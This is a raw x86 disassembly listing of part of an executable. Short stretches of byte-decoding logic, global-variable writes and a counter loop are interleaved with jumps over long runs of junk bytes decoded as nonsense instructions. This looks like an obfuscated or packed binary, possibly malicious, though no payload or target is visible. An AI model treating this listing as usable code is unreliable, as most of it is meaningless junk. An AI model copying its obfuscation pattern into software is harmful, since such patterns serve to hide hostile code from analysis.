  403b24:	sbb    DWORD PTR ds:0x4292bd,edi
  403b2a:	mov    al,BYTE PTR [ebp-0x1]
  403b2d:	xor    DWORD PTR ds:0x4292b9,0x35da
  403b37:	mov    ecx,DWORD PTR [ebp-0x10]
  403b3a:	xor    DWORD PTR ds:0x4292bd,0x513b
  403b44:	xor    al,0x49
  403b46:	xor    DWORD PTR ds:0x42c89a,0x3273
  403b50:	sub    al,0x35
  403b52:	add    DWORD PTR ds:0x4292a5,0x42759c
  403b5c:	mov    BYTE PTR [ecx],al
  403b5e:	xor    DWORD PTR ds:0x427d17,0x427d07
  403b68:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  403b6f:	jmp    0x403c74
  403b74:	(bad)  
  403b75:	xor    cl,BYTE PTR [edi]
  403b77:	adc    ebx,DWORD PTR [ebx]
  403b79:	in     eax,0xfa
  403b7b:	std    
  403b7c:	add    edi,DWORD PTR [edx-0x4fb738c1]
  403b82:	or     ch,al
  403b84:	out    dx,al
  403b85:	push   es
  403b86:	jl     0x403c04
  403b88:	push   esp
  403b89:	jl     0x403c07
  403b8b:	jl     0x403b42
  403b8d:	div    BYTE PTR [ebx-0x77d6938b]
  403b93:	jae    0x403bfb
  403b95:	arpl   WORD PTR [ecx],dx
  403b97:	cdq    
  403b98:	jl     0x403b77
  403b9a:	(bad)  
  403b9b:	cli    
  403b9c:	cmp    edx,ecx
  403b9e:	mov    ds:0xd1ff5ddc,al
  403ba3:	xor    DWORD PTR [ebx],ecx
  403ba5:	add    BYTE PTR [edi-0x56d2d13d],0xb1
  403bac:	push   edx
  403bad:	pop    esp
  403bae:	and    esi,0xa415a08e
  403bb4:	ins    BYTE PTR es:[edi],dx
  403bb5:	or     cl,0xb
  403bb8:	sbb    eax,0xea91054e
  403bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bbe:	aaa    
  403bbf:	xor    eax,0x76a937bf
  403bc4:	xchg   ebx,eax
  403bc5:	xchg   ecx,eax
  403bc6:	fld    DWORD PTR [eax-0x1fb653f6]
  403bcc:	mov    ah,0xd8
  403bce:	or     edx,DWORD PTR [ebx+0x2cc1107a]
  403bd4:	add    eax,0xf94d8b1f
  403bd9:	mov    DWORD PTR [edi+0x7e],0xad915605
  403be0:	jnp    0x403be2
  403be2:	fnsave [esp+eax*8]
  403be5:	shl    BYTE PTR [edi-0x5f],1
  403be8:	pop    ds
  403be9:	xchg   ebp,eax
  403bea:	in     al,dx
  403beb:	adc    ecx,DWORD PTR ds:0xcc79e1d3
  403bf1:	xchg   ebp,eax
  403bf2:	cmp    al,0xb6
  403bf4:	shr    edi,0x41
  403bf7:	in     eax,dx
  403bf8:	inc    ebp
  403bf9:	ins    DWORD PTR es:[edi],dx
  403bfa:	xor    al,0xfc
  403bfc:	lock xchg ebx,eax
  403bfe:	push   es
  403bff:	or     BYTE PTR [ebx+0x16],0x6b
  403c03:	pop    edi
  403c04:	cs aad 0xf7
  403c07:	ins    BYTE PTR es:[edi],dx
  403c08:	add    BYTE PTR [ecx],0xcb
  403c0b:	push   ecx
  403c0c:	es jl  0x403c28
  403c0f:	pop    edi
  403c10:	push   esp
  403c11:	ja     0x403bac
  403c13:	pop    ds
  403c14:	fcmovne st,st(6)
  403c16:	ror    DWORD PTR [edx+0x2bf07453],1
  403c1c:	lea    edx,ds:0x55a0a90d
  403c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c23:	and    ecx,DWORD PTR [edi-0x5e]
  403c26:	scas   al,BYTE PTR es:[edi]
  403c27:	(bad)  
  403c28:	lock in eax,dx
  403c2a:	dec    eax
  403c2b:	cmp    ch,ah
  403c2d:	sbb    edx,DWORD PTR [edi-0x7a91a962]
  403c33:	retf   
  403c34:	out    0x66,eax
  403c36:	push   cs
  403c37:	fistp  DWORD PTR [eax-0x59548b54]
  403c3d:	jo     0x403bc9
  403c3f:	jge    0x403c26
  403c41:	lods   al,BYTE PTR ds:[esi]
  403c42:	pop    es
  403c43:	ret    0x7fc1
  403c46:	not    ch
  403c48:	dec    esi
  403c49:	push   edx
  403c4a:	jne    0x403cb6
  403c4c:	and    bl,BYTE PTR [eax+0x46]
  403c4f:	jae    0x403bd3
  403c51:	out    0xb3,eax
  403c53:	ret    
  403c54:	push   edx
  403c55:	sbb    al,0xfb
  403c57:	xor    al,0x4c
  403c59:	mov    ds:0xf0bc4153,eax
  403c5e:	jo     0x403c2b
  403c60:	add    BYTE PTR [ebp+edx*4-0x3d],bh
  403c64:	mov    al,BYTE PTR [esi]
  403c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c67:	jl     0x403be9
  403c69:	jbe    0x403ccb
  403c6b:	(bad)  
  403c6c:	lea    eax,[ecx-0x32cd4bc3]
  403c72:	inc    edx
  403c73:	mov    cl,0xc7
  403c75:	inc    ebp
  403c76:	lock xor al,0x85
  403c79:	pushf  
  403c7a:	clc    
  403c7b:	mov    eax,ds:0x42c8be
  403c80:	mov    ecx,DWORD PTR ds:0x4278bb
  403c86:	sub    eax,ecx
  403c88:	sub    eax,DWORD PTR [eax+ecx*1]
  403c8b:	mov    eax,DWORD PTR [ebp-0x8]
  403c8e:	mov    ecx,0x7510857
  403c93:	push   esi
  403c94:	xor    eax,ecx
  403c96:	movzx  esi,BYTE PTR ds:0x427d03
  403c9d:	sub    DWORD PTR ds:0x4292d9,esi
  403ca3:	jmp    0x403da8
  403ca8:	cld    
  403ca9:	pop    eax
  403caa:	cwde   
  403cab:	daa    
  403cac:	pop    eax
  403cad:	out    0x93,eax
  403caf:	jnp    0x403d22
  403cb1:	or     esp,0x29
  403cb4:	mov    ds:0xc641ffd9,eax
  403cb9:	sbb    DWORD PTR [esp+edi*2+0x54],edi
  403cbd:	jl     0x403d3b
  403cbf:	jl     0x403c53
  403cc1:	imul   eax,eax,0x796a8a4e
  403cc7:	jbe    0x403c6d
  403cc9:	xchg   ecx,eax
  403cca:	data16 repz fisttp WORD PTR [edx]
  403cce:	cdq    
  403ccf:	aad    0xa5
  403cd1:	sbb    DWORD PTR [eax+0x8b0c1e2],esi
  403cd7:	faddp  st(1),st
  403cd9:	push   ds
  403cda:	pop    ss
  403cdb:	sbb    cl,BYTE PTR [ebx+eax*1-0x7f]
  403cdf:	mov    dl,0xd7
  403ce1:	daa    
  403ce2:	push   edi
  403ce3:	sub    al,0x2a
  403ce5:	(bad)  
  403ce6:	jecxz  0x403cd2
  403ce8:	xchg   ebx,eax
  403ce9:	sbb    bl,cl
  403ceb:	pushf  
  403cec:	(bad)  
  403ced:	jo     0x403d13
  403cef:	add    cl,cl
  403cf1:	enter  0xddbc,0x2c
  403cf5:	int3   
  403cf6:	out    dx,al
  403cf7:	arpl   WORD PTR [edi],si
  403cf9:	sti    
  403cfa:	ins    DWORD PTR es:[edi],dx
  403cfb:	(bad)  
  403cfc:	movd   DWORD PTR [eax+0x32f319fe],mm7
  403d03:	dec    esi
  403d04:	nop
  403d05:	loop   0x403d36
  403d07:	add    BYTE PTR [ebx],ah
  403d09:	mov    edx,0xd38c0060
  403d0e:	(bad)  
  403d0f:	repz xchg ebx,eax
  403d11:	fwait
  403d12:	scas   al,BYTE PTR es:[edi]
  403d13:	xor    cl,0x46
  403d16:	jmp    0xe46eb05f
  403d1b:	xchg   ebx,eax
  403d1c:	jo     0x403ccb
  403d1e:	dec    BYTE PTR [eax-0x6b96fc50]
  403d24:	jbe    0x403d02
  403d26:	imul   ebx,DWORD PTR [ebx+0x1a],0xf
  403d2a:	popf   
  403d2b:	test   DWORD PTR [edx+eiz*8-0xefbab18],ebp
  403d32:	sbb    eax,0x40a1e33a
  403d37:	mov    ch,BYTE PTR ds:0x184f0f4c
  403d3d:	ror    BYTE PTR [eax],cl
  403d3f:	add    DWORD PTR [edi-0x75],ebp
  403d42:	nop
  403d43:	lds    esp,FWORD PTR [ebp+0x5062ee8]
  403d49:	cmc    
  403d4a:	out    0x1d,al
  403d4c:	and    DWORD PTR [esi+0x14],0x1c
  403d50:	jmp    0x2e871232
  403d55:	test   eax,0x80435f9c
  403d5a:	inc    bx
  403d5c:	imul   edi,DWORD PTR [eax],0xffffffe3
  403d5f:	int3   
  403d60:	inc    ebp
  403d61:	sub    dx,WORD PTR [ebp-0x4d]
  403d65:	push   eax
  403d66:	mov    ch,0x52
  403d68:	fwait
  403d69:	cli    
  403d6a:	dec    ecx
  403d6b:	enter  0xaa63,0x5e
  403d6f:	loopne 0x403d49
  403d71:	cmp    al,0xcf
  403d73:	ror    BYTE PTR [esi+esi*4-0x4e28d2e0],0x24
  403d7b:	cmp    DWORD PTR [edx],ebx
  403d7d:	mov    edx,0xea377d28
  403d82:	inc    esi
  403d83:	cmp    BYTE PTR [ebx+0xa],ah
  403d86:	pop    edi
  403d87:	cmp    ah,BYTE PTR [ebx+0x61]
  403d8a:	dec    ebp
  403d8b:	dec    ebp
  403d8c:	add    ebp,DWORD PTR ds:0xe735e84c
  403d92:	dec    esp
  403d93:	xchg   esi,eax
  403d94:	sub    ebx,DWORD PTR [ebx]
  403d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d97:	mov    edx,0x868a7717
  403d9c:	leave  
  403d9d:	xchg   BYTE PTR ds:0x8d329661,dh
  403da3:	in     al,0xc2
  403da5:	test   ecx,ecx
  403da7:	aas    
  403da8:	mov    esi,0x32729e
  403dad:	sbb    DWORD PTR ds:0x427598,0x734e
  403db7:	add    eax,esi
  403db9:	mov    DWORD PTR ds:0x4292d9,0x3d2c
  403dc3:	jmp    0x403ee9
  403dc8:	mov    DWORD PTR ds:0x4292d5,0x6a19
  403dd2:	mov    dl,BYTE PTR [ebp-0x1]
  403dd5:	jmp    0x403eda
  403dda:	sub    DWORD PTR [edi+edi*4+0x69d96176],eax
  403de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de2:	sub    al,0x65
  403de4:	sbb    BYTE PTR [esi],ch
  403de6:	push   eax
  403de7:	jg     0x403e27
  403de9:	sar    BYTE PTR [esi],1
  403deb:	sbb    BYTE PTR [esp+edi*2+0x54],bh
  403def:	jl     0x403e6d
  403df1:	jl     0x403db1
  403df3:	jo     0x403e5b
  403df5:	cmc    
  403df6:	xchg   esi,eax
  403df7:	frstor [ecx+0x46281d32]
  403dfd:	adc    BYTE PTR [esi],0x9e
  403e00:	repnz pop es
  403e02:	test   BYTE PTR [ebx],ah
  403e04:	jnp    0x403e33
  403e06:	js     0x403e65
  403e08:	sub    BYTE PTR [ecx+ebx*8+0x3f],bh
  403e0c:	cmp    DWORD PTR [ecx],eax
  403e0e:	outs   dx,DWORD PTR ds:[esi]
  403e0f:	hlt    
  403e10:	and    BYTE PTR [edx+0x42],ah
  403e13:	xchg   ebx,eax
  403e14:	leave  
  403e15:	jo     0x403e8d
  403e17:	repnz sub esp,DWORD PTR [edi-0x649b8f7]
  403e1e:	or     ebp,ecx
  403e20:	aad    0xc5
  403e22:	or     al,0x17
  403e24:	mov    bl,0xfb
  403e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e27:	lock cdq 
  403e29:	enter  0xe65f,0xa1
  403e2d:	dec    ecx
  403e2e:	pop    ebx
  403e2f:	cmp    ebx,eax
  403e31:	jno    0x403e95
  403e33:	push   edx
  403e34:	cmp    cl,bl
  403e36:	ja     0x403ddc
  403e38:	fwait
  403e39:	and    ecx,DWORD PTR [ecx+0x75]
  403e3c:	pusha  
  403e3d:	psllq  mm0,mm2
  403e40:	cmp    eax,0x341fa1e3
  403e45:	test   al,0x60
  403e47:	cli    
  403e48:	and    eax,0x4a7c4557
  403e4d:	adc    eax,0x1dba2c2e
  403e52:	adc    eax,0x8f3eb0d4
  403e57:	imul   edx,DWORD PTR [esi],0x35
  403e5a:	or     eax,0x28148c24
  403e5f:	inc    eax
  403e60:	add    DWORD PTR [esi-0x75ebb133],0xac77f5ae
  403e6a:	sbb    eax,0xe4609527
  403e6f:	push   esi
  403e70:	repz sbb dl,BYTE PTR [edi+edi*2]
  403e74:	(bad)  
  403e75:	and    BYTE PTR [ecx],bl
  403e77:	push   cs
  403e78:	cmp    eax,0x43498b2d
  403e7d:	inc    edx
  403e7e:	pushf  
  403e7f:	add    esi,esi
  403e81:	mov    al,ds:0xd9b80c5d
  403e86:	clc    
  403e87:	cmc    
  403e88:	and    BYTE PTR [eax],0xa2
  403e8b:	xchg   ecx,eax
  403e8c:	inc    edi
  403e8d:	imul   esp,DWORD PTR [edi+ecx*4],0xffffff85
  403e91:	cmovp  edi,DWORD PTR [edi-0x28f28ccd]
  403e98:	(bad)  
  403e99:	int    0xc2
  403e9b:	(bad)  
  403e9c:	cld    
  403e9d:	ds xchg edx,eax
  403e9f:	mov    ebx,0xf00816a0
  403ea4:	sub    eax,0x88b38efd
  403ea9:	iret   
  403eaa:	xchg   esp,eax
  403eab:	fisub  WORD PTR [ecx+0x2a]
  403eae:	sbb    al,0x46
  403eb0:	pop    ds
  403eb1:	adc    esp,DWORD PTR [edi]
  403eb3:	pop    ebp
  403eb4:	add    al,0x5e
  403eb6:	test   al,0xea
  403eb8:	mov    esi,0xdcb61295
  403ebd:	ror    DWORD PTR [ebx+edx*1+0x50bb36cf],cl
  403ec4:	mov    ecx,0x9992a25e
  403ec9:	or     edi,ecx
  403ecb:	sahf   
  403ecc:	mov    ebp,fs
  403ece:	push   es
  403ecf:	test   al,al
  403ed1:	shr    ebp,1
  403ed3:	in     al,dx
  403ed4:	push   ds
  403ed5:	jnp    0x403ec9
  403ed7:	mov    bl,BYTE PTR [esi+0x55488fa]
  403edd:	test   al,0xc7
  403edf:	add    eax,0x427598
  403ee4:	(bad)  
  403ee6:	add    BYTE PTR [eax],al
  403ee8:	inc    eax
  403ee9:	cmp    eax,0x40
  403eec:	mov    DWORD PTR ds:0x4292cd,0x3a6f
  403ef6:	jb     0x403dc8
  403efc:	mov    edx,DWORD PTR ds:0x4292e9
  403f02:	mov    edx,DWORD PTR [edx]
  403f04:	xor    DWORD PTR ds:0x427d07,edx
  403f0a:	mov    edx,DWORD PTR [ebp-0x8]
  403f0d:	xor    eax,0x54c0
  403f12:	mov    eax,DWORD PTR [ebp-0xc]
  403f15:	xor    edx,ecx
  403f17:	adc    DWORD PTR ds:0x4275a8,0x4292d1
  403f21:	jmp    0x404026
  403f26:	push   cs
  403f27:	ds add al,0xd
  403f2a:	(bad)  
  403f2b:	fld    QWORD PTR ds:0x74fb2bdd
  403f31:	sub    DWORD PTR [eax-0x29],eax
  403f34:	lods   al,BYTE PTR ds:[esi]
  403f35:	test   BYTE PTR [esi],dl
  403f37:	sbb    edi,DWORD PTR [esp+edi*2+0x54]
  403f3b:	jl     0x403fb9
  403f3d:	jl     0x403f89
  403f3f:	push   esi
  403f40:	cmp    cl,ah
  403f42:	out    0xc2,al
  403f44:	inc    edx
  403f45:	xchg   esp,edx
  403f47:	adc    esp,DWORD PTR [eax]
  403f49:	push   edx
  403f4a:	dec    esp
  403f4b:	and    DWORD PTR [edx-0x6e455cd4],ebp
  403f51:	mov    ds:0xeb5d8d06,eax
  403f56:	jno    0x403fd4
  403f58:	int3   
  403f59:	cdq    
  403f5a:	mov    ah,0xa
  403f5c:	dec    eax
  403f5d:	leave  
  403f5e:	es push 0xd
  403f61:	add    BYTE PTR [esi],dl
  403f63:	inc    esi
  403f64:	sub    cl,BYTE PTR [ebx+0x504ba57d]
  403f6a:	jle    0x403f4b
  403f6c:	adc    eax,0x4feedcfa
  403f71:	pop    ss
  403f72:	mul    DWORD PTR [ebp-0x12]
  403f75:	add    BYTE PTR [eax-0x34],0x1a
  403f79:	mov    bh,0x86
  403f7b:	retf   
  403f7c:	pop    es
  403f7d:	xchg   edx,eax
  403f7e:	repnz stc 
  403f80:	out    0x91,al
  403f82:	hlt    
  403f83:	es in  eax,0xd8
  403f86:	fistp  DWORD PTR [esi+0x766877c2]
  403f8c:	sbb    BYTE PTR [ebx+0x30],dl
  403f8f:	jmp    0x35d938d6
  403f94:	mov    dl,BYTE PTR [ecx-0x7e]
  403f97:	popa   
  403f98:	clc    
  403f99:	mov    al,ds:0x39a73f7f
  403f9e:	or     al,0xbc
  403fa0:	mov    WORD PTR [edi+0x43],cs
  403fa3:	sbb    BYTE PTR [ecx-0x3b501e58],ch
  403fa9:	jp     0x40400d
  403fab:	pop    es
  403fac:	(bad)  
  403fad:	rcr    esi,cl
  403faf:	outs   dx,BYTE PTR ds:[esi]
  403fb0:	scas   eax,DWORD PTR es:[edi]
  403fb1:	dec    esi
  403fb2:	fdiv   st,st(0)
  403fb4:	xor    al,0x1a
  403fb6:	les    ebx,FWORD PTR [esi]
  403fb8:	dec    BYTE PTR [esi+edx*8-0x50]
  403fbc:	pop    ds
  403fbd:	mov    dh,0x27
  403fbf:	sub    DWORD PTR [edi],ebp
  403fc1:	jp     0x403f85
  403fc3:	sbb    al,0x34
  403fc5:	je     0x403fc5
  403fc7:	inc    esp
  403fc8:	lods   eax,DWORD PTR ds:[esi]
  403fc9:	sub    ebp,ecx
  403fcb:	or     DWORD PTR [esp+eiz*4],ebp
  403fce:	push   ds
  403fcf:	push   0xba8f5d02
  403fd4:	(bad)  
  403fd5:	out    dx,eax
  403fd6:	dec    edx
  403fd7:	xchg   ebx,eax
  403fd8:	sub    edx,eax
  403fda:	bound  esp,QWORD PTR [edi+0x37]
  403fdd:	arpl   WORD PTR [esi-0xd903e67],bp
  403fe3:	loop   0x403fe9
  403fe5:	stos   BYTE PTR es:[edi],al
  403fe6:	daa    
  403fe7:	test   DWORD PTR [ecx],edx
  403fe9:	retf   0x631c
  403fec:	int3   
  403fed:	cmp    cl,ah
  403fef:	popa   
  403ff0:	stc    
  403ff1:	cmp    eax,0x9594f225
  403ff6:	pop    edi
  403ff7:	mov    ds:0x6ba6efca,eax
  403ffc:	pop    ds
  403ffd:	stos   BYTE PTR es:[edi],al
  403ffe:	pop    es
  403fff:	mov    dl,0x49
  404001:	repnz dec esi
  404003:	stc    
  404004:	xor    eax,0x822cbebe
  404009:	jg     0x404005
  40400b:	adc    al,dl
  40400d:	pop    ebx
  40400e:	or     DWORD PTR [eax+0x230edd58],ebx
  404014:	and    ebp,DWORD PTR [esi-0x34]
  404017:	push   edi
  404018:	cmp    dh,BYTE PTR [bx+di-0x33]
  40401c:	enter  0xe651,0x56
  404020:	mov    ch,0x58
  404022:	sar    BYTE PTR [eax*8-0x3829fc0f],cl
  404029:	add    eax,0x42c88a
  40402e:	scas   eax,DWORD PTR es:[edi]
  40402f:	jp     0x404031
  404031:	add    BYTE PTR [ebx],bh
  404033:	rol    bh,1
  404035:	add    eax,0x4292c1
  40403a:	cmp    bh,BYTE PTR [esi+0x0]
  40403d:	add    BYTE PTR [edi],cl
  40403f:	test   BYTE PTR [ecx-0x7efffffd],ah
  404045:	and    eax,0x42c88a
  40404a:	add    BYTE PTR [eax],al
  40404c:	add    BYTE PTR [eax],al
  40404e:	mov    eax,ds:0x42c88a
  404053:	inc    eax
  404054:	mov    ds:0x42c88a,eax
  404059:	cmp    DWORD PTR ds:0x42c88a,0xa
  404060:	jne    0x404071
  404066:	push   0x1f92
  40406b:	call   DWORD PTR ds:0x427c47
  404071:	cmp    DWORD PTR ds:0x42c88a,0x9
  404078:	jne    0x404089
  40407e:	mov    eax,ds:0x42c88a
  404083:	inc    eax
  404084:	mov    ds:0x42c88a,eax
  404089:	cmp    DWORD PTR ds:0x42c88a,0x1a
  404090:	jb     0x40404e
  404096:	push   ebx
  404097:	jmp    0x40419c
  40409c:	mov    fs,WORD PTR [edi]
  40409e:	mov    al,0x47
  4040a0:	ins    DWORD PTR es:[edi],dx
  4040a1:	jnp    0x404040
  4040a3:	stc    
  4040a4:	sbb    al,ch
  4040a6:	(bad)  
  4040a7:	nop
  4040a8:	lds    edi,FWORD PTR [ebp+0x1a0ebadc]
  4040ae:	jl     0x40412c
  4040b0:	push   esp
  4040b1:	jl     0x40412f
  4040b3:	jl     0x404067
  4040b5:	popa   
  4040b6:	stos   DWORD PTR es:[edi],eax
  4040b7:	rcr    DWORD PTR [ebx],1
  4040b9:	daa    
  4040ba:	and    BYTE PTR [ecx],al
  4040bc:	lock in al,dx
  4040be:	fstp   TBYTE PTR [eax]
  4040c0:	sub    DWORD PTR [edx-0x7c],esp
  4040c3:	sub    DWORD PTR [ebp-0x1e],0x80cf0b5
  4040ca:	sahf   
  4040cb:	pop    es
  4040cc:	in     al,dx
  4040cd:	aaa    
  4040ce:	(bad)  
  4040cf:	gs mov ch,0x63
  4040d2:	push   ebp
  4040d3:	test   ebp,edx
  4040d5:	ins    DWORD PTR es:[edi],dx
  4040d6:	stos   DWORD PTR es:[edi],eax
  4040d7:	repz sub DWORD PTR [ebx+0x19f7deae],esi
  4040de:	ret    0x75ed
  4040e1:	adc    DWORD PTR [edi+0x42deacf],esp
  4040e7:	pop    ds
  4040e8:	add    al,0x85
  4040ea:	call   FWORD PTR [eax+eiz*1-0x2]
  4040ee:	fstp   DWORD PTR [eax+0x6949b60e]
  4040f4:	lds    edx,FWORD PTR [eax+0x1ff3592a]
  4040fa:	mov    ch,0x36
  4040fc:	scas   eax,DWORD PTR es:[edi]
  4040fd:	pop    eax
  4040fe:	fidiv  WORD PTR [edi+ecx*4]
  404101:	or     ebx,DWORD PTR [esi]
  404103:	mov    DWORD PTR [esi+0x1e],0x8a8ff4d
  40410a:	data16 xor dh,BYTE PTR [ecx-0x75]
  40410e:	and    eax,0x135a6804
  404113:	ja     0x4040a7
  404115:	imul   eax,eax,0x2e6b769d
  40411b:	cmp    esi,DWORD PTR [edx+eiz*4+0x30]
  40411f:	xchg   BYTE PTR [eax-0x53c8ed7b],bl
  404125:	aam    0x56
  404127:	xor    bl,bh
  404129:	push   ecx
  40412a:	fs (bad) 
  40412c:	mov    ch,0xf8
  40412e:	mov    ds:0xe31afda9,al
  404133:	outs   dx,DWORD PTR ds:[esi]
  404134:	push   es
  404135:	and    eax,0x6724b324
  40413a:	pushf  
  40413b:	jae    0x4041aa
  40413d:	sbb    eax,0x2a3640e3
  404142:	retf   0xcc9f
  404145:	ins    DWORD PTR es:[edi],dx
  404146:	or     dh,ch
  404148:	sbb    esi,edx
  40414a:	pop    ss
  40414b:	inc    edi
  40414c:	sbb    eax,edi
  40414e:	data16 cmc 
  404150:	int3   
  404151:	adc    DWORD PTR [eax+0x70416227],ecx
  404157:	stos   BYTE PTR es:[edi],al
  404158:	and    BYTE PTR [ecx+0x47],cl
  40415b:	mov    ebp,0x897ca203
  404160:	(bad)  
  404161:	xor    edi,DWORD PTR [eax+ebp*1]
  404164:	xchg   esp,ebp
  404166:	dec    esi
  404167:	or     eax,DWORD PTR [ebp+0x5f81f18a]
  40416d:	loope  0x40417e
  40416f:	inc    esi
  404170:	mov    dl,BYTE PTR [eax-0x1a941f13]
  404176:	js     0x40419d
  404178:	cmp    edi,ebx
  40417a:	mov    esi,0xfde2c0bd
  40417f:	dec    edi
  404180:	jle    0x404140
  404182:	sbb    BYTE PTR [edi],cl
  404184:	ror    BYTE PTR [edi+esi*1+0x5888b56],1
  40418b:	dec    esp
  40418c:	jbe    0x4041c4
  40418e:	(bad)  
  40418f:	cs xor edi,0x31
  404193:	xchg   ebp,eax
  404194:	mov    ds:0xb524d43,al
  404199:	or     ebx,DWORD PTR [ebx+0x7d8b573c]
  40419f:	or     BYTE PTR [eax+0x8a42],bh
  4041a5:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4041aa:	jmp    0x4042af
  4041af:	sbb    eax,0x673c6c22
  4041b4:	mov    dl,0xbd
  4041b6:	std    
  4041b7:	adc    ah,BYTE PTR [ebx-0x4317c5f8]
  4041bd:	arpl   WORD PTR [esi+eiz*2+0x547c7c1a],bp
  4041c4:	jl     0x404242
  4041c6:	jl     0x40420d
  4041c8:	adc    eax,ebp
  4041ca:	xor    BYTE PTR [edi],dh
  4041cc:	sub    eax,0x89f11029
  4041d1:	leave  
  4041d2:	cmp    eax,0xb5d22c07
  4041d7:	jo     0x40419c
  4041d9:	das    
  4041da:	or     eax,0x3b47615b
  4041df:	sbb    eax,0xe4b28bb8
  4041e4:	sub    eax,0x89b1813e
  4041e9:	mov    dl,bh
  4041eb:	add    bh,bh
  4041ed:	jmp    0x10a1:0xcfecb58d
  4041f4:	mov    WORD PTR [edx+eiz*8+0x51045238],ds
  4041fb:	add    ecx,DWORD PTR [edx+0x44]
  4041fe:	push   0xffffff89
  404200:	adc    DWORD PTR [ebx],esi
  404202:	xchg   ebx,eax
  404203:	shr    BYTE PTR [eax+0x24e4aecf],0xed
  40420a:	retw   0xedc9
  40420e:	xor    ebp,ecx
  404210:	inc    ebp
  404211:	rcr    DWORD PTR [eax*1+0x3dabee12],cl
  404218:	out    dx,al
  404219:	xchg   BYTE PTR [ebp-0x79],al
  40421c:	ins    BYTE PTR es:[edi],dx
  40421d:	nop
  40421e:	jmp    0x63ca5711
  404223:	xchg   BYTE PTR ds:0xe49a0bec,al
  404229:	aas    
  40422a:	pop    ss
  40422b:	pop    ebp
  40422c:	mov    al,0xf8
  40422e:	or     bh,cl
  404230:	and    ebx,edx
  404232:	test   DWORD PTR [ebp-0xb],edi
  404235:	sub    eax,0x789f7c40
  40423a:	sub    al,0xb5
  40423c:	(bad)  
  40423d:	xor    eax,0x34d397c1
  404242:	add    dl,BYTE PTR [ebp-0x736fcee9]
  404248:	outs   dx,BYTE PTR ds:[esi]
  404249:	jge    0x404284
  40424b:	pop    edi
  40424c:	xchg   esi,eax
  40424d:	mov    dh,0xca
  40424f:	cmp    ch,BYTE PTR [ecx]
  404251:	and    al,0x69
  404253:	or     BYTE PTR [ebx-0x6d],0x6c
  404257:	sbb    BYTE PTR [ebp+0x2786b798],bh
  40425d:	in     eax,dx
  40425e:	adc    al,BYTE PTR [ecx]
  404260:	lea    eax,[esi+edx*8-0x5b0b248b]
  404267:	push   edx
  404268:	cmp    BYTE PTR [eax-0x6],ch
  40426b:	je     0x404293
  40426d:	int    0xc4
  40426f:	out    0x8c,eax
  404271:	push   es
  404272:	ja     0x404207
  404274:	sub    edx,ebp
  404276:	data16 cmc 
  404278:	xchg   esp,eax
  404279:	int3   
  40427a:	pop    eax
  40427b:	xchg   ebx,eax
  40427c:	rcr    DWORD PTR [ebx+ebp*2-0x12],cl
  404280:	aas    
  404281:	gs pop edi
  404283:	fidiv  WORD PTR [edi-0x5d]
  404286:	sbb    bl,ch
  404288:	or     al,0x66
  40428a:	jbe    0x4042b9
  40428c:	inc    edx
  40428d:	ins    DWORD PTR es:[edi],dx
  40428e:	out    dx,eax
  40428f:	jle    0x404226
  404291:	lea    edx,[ebx+0x8]
  404294:	adc    eax,0x33e3ad1d
  404299:	aad    0x17
  40429b:	(bad)  
  40429c:	inc    ecx
  40429d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429e:	pop    ebx
  40429f:	mov    al,BYTE PTR [ebx]
  4042a1:	outs   dx,DWORD PTR ds:[esi]
  4042a2:	jmp    0x412b6806
  4042a7:	adc    esp,0xd3087e40
  4042ad:	stc    
  4042ae:	jae    0x40426f
  4042b0:	or     BYTE PTR [ebx],bh
  4042b2:	add    BYTE PTR [eax],al
  4042b4:	add    ax,di
  4042b7:	movzx  eax,ax
  4042ba:	mov    DWORD PTR [ebp-0x14],eax
  4042bd:	mov    eax,DWORD PTR [ebp+0x8]
  4042c0:	movzx  eax,WORD PTR [eax+edx*4]
  4042c4:	xor    eax,0x8a42
  4042c9:	add    eax,edi
  4042cb:	mov    edi,DWORD PTR [ebp-0x14]
  4042ce:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4042d2:	mov    eax,DWORD PTR [ebp-0xc]
  4042d5:	inc    edx
  4042d6:	cmp    edx,eax
  4042d8:	jmp    0x4043dd
  4042dd:	daa    
  4042de:	mov    edi,0x79794fe9
  4042e3:	mov    ecx,0xc966f157
  4042e8:	dec    esi
  4042e9:	dec    ebx
  4042ea:	(bad)  
  4042eb:	cld    
  4042ec:	cmp    eax,0x7c7c1d5e
  4042f1:	push   esp
  4042f2:	jl     0x404370
  4042f4:	jl     0x404291
  4042f6:	push   edi
  4042f7:	push   edx
  4042f8:	push   esp
  4042f9:	rcl    DWORD PTR ds:0x5c681ae8,1
  4042ff:	adc    BYTE PTR ds:0x3bc56eb8,dl
  404305:	sbb    al,0xe6
  404307:	arpl   WORD PTR [ebp-0x55c764a6],dx
  40430d:	arpl   WORD PTR [ebx],ax
  40430f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404310:	jmp    0x542cf51e
  404315:	push   ss
  404316:	push   ds
  404317:	je     0x404393
  404319:	push   edx
  40431a:	retf   0xc262
  40431d:	mov    dh,ah
  40431f:	rcl    DWORD PTR [edx-0x41],0xf6
  404323:	out    0x6d,eax
  404325:	repnz xor esi,DWORD PTR [ebx]
  404328:	ret    0xebe
  40432b:	mov    ds:0x87076e73,al
  404330:	stos   DWORD PTR es:[edi],eax
  404331:	sbb    al,0x1
  404333:	mov    edi,ecx
  404335:	adc    DWORD PTR ds:0x523f3cbd,0x9e7bf8f4
  40433f:	fs ins BYTE PTR es:[edi],dx
  404341:	jl     0x4043ad
  404343:	mov    bl,0x11
  404345:	pushf  
  404346:	xor    eax,ebx
  404348:	add    ebx,DWORD PTR [ecx+0x2e]
  40434b:	push   edx
  40434c:	int3   
  40434d:	dec    esi
  40434e:	jbe    0x40433d
  404350:	xor    BYTE PTR [edx],0x14
  404353:	aas    
  404354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404355:	inc    eax
  404356:	sbb    eax,0xf84bed18
  40435b:	stos   BYTE PTR es:[edi],al
  40435c:	mov    dl,0xb
  40435e:	out    0xcc,al
  404360:	inc    edi
